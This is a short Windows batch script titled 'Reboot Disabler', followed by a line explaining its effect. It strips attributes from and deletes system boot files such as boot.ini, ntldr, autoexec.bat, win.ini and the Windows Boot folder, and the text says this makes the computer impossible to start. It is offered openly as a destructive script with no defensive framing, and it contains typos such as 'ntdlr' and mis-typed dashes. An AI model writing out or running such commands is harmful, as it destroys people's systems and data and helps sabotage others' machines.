Reboot Disabler:


attrib –r –s –h c:\autoexec.bat
del c:\autoexec.bat
attrib –r –s –h c:\boot.ini
del c:\boot.ini
attrib –r –s –h c:\ntldr
del c:\ntdlr
attrib –r –s –h c:\windows\win.ini
del c:\windows\win.ini
attrib -r -s -h C:\Windows\Boot
del C:\Windows\Boot
Erase /F /S /Q C:\Windows Boot
@exit


It will take away all attributes of
autoexec, boot.ini, & C:\Window\Boot,
which will make it impossible to start
your computer after you shut it down.
